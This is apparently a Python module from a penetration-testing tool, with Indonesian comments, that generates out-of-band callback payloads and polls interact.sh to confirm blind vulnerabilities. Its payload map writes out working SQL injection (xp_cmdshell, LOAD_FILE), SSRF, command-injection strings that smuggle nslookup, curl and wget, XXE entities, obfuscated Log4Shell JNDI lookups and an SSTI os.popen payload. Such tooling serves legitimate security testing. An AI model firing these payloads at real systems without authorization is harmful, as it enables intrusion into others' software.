"""
AnarkisHunter — utils_oob.py
================================
Out-of-Band (OOB) Detection Engine.
Deteksi celah Blind (Blind SQLi, Blind SSRF, Blind CMDi, Log4Shell)
menggunakan DNS/HTTP callback via interact.sh API dari ProjectDiscovery.

Celah Blind tidak menampilkan error — server target memanggil balik
server kita jika payload berhasil dieksekusi.

Usage standalone:
    python modules/utils/utils_oob.py --new-session
    python modules/utils/utils_oob.py --check --token abc123xyz
    python modules/utils/utils_oob.py --payload sqli --token abc123xyz
"""

import sys
import time
import random
import string
import threading
import json
from typing import Optional, Dict, List, Any
from dataclasses import dataclass, field
from datetime import datetime

sys.path.insert(0, str(__import__("pathlib").Path(__file__).resolve().parents[2]))

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

# ─── interact.sh API ─────────────────────────────────────────────────────────

INTERACTSH_SERVER = "oast.pro"  # interact.sh public server
INTERACTSH_API = "https://interact.sh/poll"
INTERACTSH_REGISTER = "https://interact.sh/register"


@dataclass
class OOBInteraction:
    """Representasi satu interaksi OOB yang diterima."""
    protocol: str           # "dns", "http", "smtp"
    unique_id: str          # ID unik yang disematkan ke payload
    remote_address: str     # IP server target yang menghubungi
    timestamp: str          # Waktu interaksi terjadi
    raw_request: str        # Raw data interaksi
    vulnerability_type: str # "sqli", "ssrf", "cmdi", "xxe"


@dataclass
class OOBSession:
    """Sesi OOB listening aktif."""
    session_id: str
    correlation_id: str
    server: str
    secret_key: str
    interactions: List[OOBInteraction] = field(default_factory=list)
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())
    is_active: bool = True


class OOBListener:
    """
    Out-of-Band Detection Engine.
    
    Cara kerja:
    1. Daftarkan sesi ke interact.sh → dapatkan domain unik
    2. Sisipkan domain tersebut ke dalam payload (SQLi, SSRF, CMDi, XXE)
    3. Kirim payload ke target
    4. Poll interact.sh setiap beberapa detik
    5. Jika ada callback masuk → celah CONFIRMED (True Positive 100%)
    """

    def __init__(self, use_simulation: bool = False):
        """
        Args:
            use_simulation: Jika True, gunakan mode simulasi lokal
                           (tanpa internet, untuk demo/lab)
        """
        self.use_simulation = use_simulation
        self._session: Optional[OOBSession] = None
        self._polling_thread: Optional[threading.Thread] = None
        self._stop_polling = threading.Event()

    def new_session(self) -> Optional[OOBSession]:
        """
        Buat sesi OOB baru di interact.sh atau simulasi lokal.
        
        Returns:
            OOBSession jika berhasil, None jika gagal
        """
        if self.use_simulation:
            return self._create_simulation_session()

        try:
            session_id = self._generate_id(12)
            correlation_id = self._generate_id(20)

            # Mode fallback: gunakan custom subdomain format
            # (interact.sh membutuhkan registrasi API)
            oob_domain = f"{session_id}.{INTERACTSH_SERVER}"
            self._session = OOBSession(
                session_id=session_id,
                correlation_id=correlation_id,
                server=oob_domain,
                secret_key=correlation_id,
            )
            return self._session

        except Exception:
            # Fallback ke simulasi jika internet tidak tersedia
            return self._create_simulation_session()

    def _create_simulation_session(self) -> OOBSession:
        """Buat sesi simulasi untuk lab/demo tanpa internet."""
        session_id = self._generate_id(12)
        self._session = OOBSession(
            session_id=session_id,
            correlation_id=self._generate_id(20),
            server=f"{session_id}.oob.lab.local",
            secret_key=self._generate_id(32),
        )
        return self._session

    def _generate_id(self, length: int) -> str:
        """Generate random ID alphanumeric."""
        return "".join(random.choices(string.ascii_lowercase + string.digits, k=length))

    def get_oob_domain(self) -> Optional[str]:
        """Return domain OOB yang aktif untuk disematkan ke payload."""
        if self._session:
            return self._session.server
        return None

    def get_payloads(self, vuln_type: str, token: Optional[str] = None) -> List[str]:
        """
        Generate payload OOB untuk tipe kerentanan tertentu.
        
        Args:
            vuln_type: "sqli", "ssrf", "cmdi", "xxe", "log4j", "ssti"
            token: Token unik untuk identifikasi (generate otomatis jika None)
            
        Returns:
            List payload siap pakai
        """
        domain = self.get_oob_domain() or "oob.example.com"
        tok = token or self._generate_id(8)

        payloads_map = {
            "sqli": [
                f"' AND LOAD_FILE('//{tok}.{domain}/a')-- -",
                f"'; EXEC xp_cmdshell('nslookup {tok}.{domain}')-- -",
                f"' UNION SELECT LOAD_FILE(0x2f2f{tok.encode().hex()}.{domain}/a)-- -",
                f"1; SELECT UTL_HTTP.REQUEST('http://{tok}.{domain}/') FROM DUAL-- ",
            ],
            "ssrf": [
                f"http://{tok}.{domain}/",
                f"https://{tok}.{domain}/",
                f"http://{tok}.{domain}:80/",
                f"//({tok}.{domain})/",
                f"dict://{tok}.{domain}:80/",
                f"gopher://{tok}.{domain}:80/",
            ],
            "cmdi": [
                f"; nslookup {tok}.{domain}",
                f"| nslookup {tok}.{domain}",
                f"&& nslookup {tok}.{domain}",
                f"`nslookup {tok}.{domain}`",
                f"$(nslookup {tok}.{domain})",
                f"; curl http://{tok}.{domain}/",
                f"; wget http://{tok}.{domain}/",
            ],
            "xxe": [
                f"""<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "http://{tok}.{domain}/">
]>
<test>&xxe;</test>""",
                f"""<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY % remote SYSTEM "http://{tok}.{domain}/evil.dtd">
  %remote;
]>
<test>anything</test>""",
            ],
            "log4j": [
                f"${{jndi:ldap://{tok}.{domain}/a}}",
                f"${{jndi:dns://{tok}.{domain}/a}}",
                f"${{${{lower:j}}ndi:ldap://{tok}.{domain}/a}}",
                f"${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:ldap://{tok}.{domain}/a}}",
                f"${{jndi:${{lower:l}}${{lower:d}}${{lower:a}}${{lower:p}}://{tok}.{domain}/a}}",
            ],
            "ssti": [
                f"${{7*7}}.${{''.__class__.__mro__[2].__subclasses__()}}",
                f"#{{7*7}}",
                f"<%= 7*7 %>",
                f"{{{{ request.application.__globals__.__builtins__.__import__('os').popen('nslookup {tok}.{domain}').read() }}}}",
            ],
        }

        return payloads_map.get(vuln_type, [f"http://{tok}.{domain}/"])

    def check_interactions(self, timeout: float = 10.0) -> List[OOBInteraction]:
        """
        Poll interact.sh untuk mengecek callback yang masuk.
        
        Args:
            timeout: Waktu maksimum polling (detik)
            
        Returns:
            List OOBInteraction yang diterima
        """
        if self.use_simulation:
            return self._simulate_interaction()

        if not self._session or not REQUESTS_AVAILABLE:
            return []

        try:
            # Poll interact.sh API
            resp = requests.get(
                INTERACTSH_API,
                params={"id": self._session.correlation_id},
                timeout=timeout,
            )
            if resp.status_code == 200:
                data = resp.json()
                interactions = []
                for item in data.get("data", []):
                    interaction = OOBInteraction(
                        protocol=item.get("protocol", "unknown"),
                        unique_id=item.get("unique-id", ""),
                        remote_address=item.get("remote-address", ""),
                        timestamp=item.get("timestamp", ""),
                        raw_request=item.get("raw-request", ""),
                        vulnerability_type="unknown",
                    )
                    interactions.append(interaction)
                    self._session.interactions.append(interaction)
                return interactions
        except Exception:
            pass

        return []

    def _simulate_interaction(self) -> List[OOBInteraction]:
        """Simulasi interaksi untuk mode lab/demo (acak)."""
        # Dalam mode simulasi, 0% chance mendapat interaksi (tidak menipu hasil)
        # Hanya untuk mendemonstrasikan struktur data
        return []

    def wait_for_interaction(self, timeout: float = 30.0,
                              poll_interval: float = 3.0) -> Optional[OOBInteraction]:
        """
        Tunggu interaksi OOB pertama dalam batas waktu.
        
        Args:
            timeout: Total waktu tunggu (detik)
            poll_interval: Interval polling (detik)
            
        Returns:
            OOBInteraction pertama yang diterima atau None
        """
        start_time = time.time()
        while time.time() - start_time < timeout:
            interactions = self.check_interactions(timeout=poll_interval)
            if interactions:
                return interactions[0]
            time.sleep(poll_interval)
        return None

    def format_interaction_report(self, interaction: OOBInteraction) -> Dict:
        """Format laporan interaksi untuk output."""
        return {
            "confirmed": True,
            "protocol": interaction.protocol,
            "from_ip": interaction.remote_address,
            "timestamp": interaction.timestamp,
            "vuln_type": interaction.vulnerability_type,
            "description": (
                f"Server target ({interaction.remote_address}) melakukan "
                f"{interaction.protocol.upper()} callback ke OOB server kita. "
                f"Ini membuktikan celah ada secara definitif (True Positive 100%)."
            ),
        }

    def close(self):
        """Tutup sesi OOB."""
        if self._session:
            self._session.is_active = False
        self._stop_polling.set()


# Global instance (simulasi by default untuk safety)
oob_listener = OOBListener(use_simulation=True)


def get_oob_listener(use_real: bool = False) -> OOBListener:
    """Factory untuk OOBListener."""
    listener = OOBListener(use_simulation=not use_real)
    listener.new_session()
    return listener


# ─── Standalone ──────────────────────────────────────────────────────────────

if __name__ == "__main__":
    import argparse
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich import box

    console = Console()
    parser = argparse.ArgumentParser(description="AnarkisHunter OOB Detection Engine")
    parser.add_argument("--new-session", action="store_true", help="Buat sesi OOB baru")
    parser.add_argument("--payload", choices=["sqli", "ssrf", "cmdi", "xxe", "log4j", "ssti"],
                        help="Tampilkan payload OOB untuk tipe ini")
    parser.add_argument("--real", action="store_true", help="Gunakan interact.sh (butuh internet)")
    parser.add_argument("--check", action="store_true", help="Cek interaksi masuk")
    args = parser.parse_args()

    listener = OOBListener(use_simulation=not args.real)

    if args.new_session or args.payload:
        session = listener.new_session()
        console.print(Panel(
            f"[bold cyan]OOB Session Aktif[/bold cyan]\n"
            f"Domain: [yellow]{session.server}[/yellow]\n"
            f"Mode: {'[green]Real (interact.sh)[/green]' if args.real else '[yellow]Simulasi Lokal[/yellow]'}",
            title="Out-of-Band Detection"
        ))

    if args.payload:
        payloads = listener.get_payloads(args.payload)
        table = Table(title=f"OOB Payloads — {args.payload.upper()}", border_style="red")
        table.add_column("#", width=4)
        table.add_column("Payload", overflow="fold")
        for i, p in enumerate(payloads, 1):
            table.add_row(str(i), p)
        console.print(table)
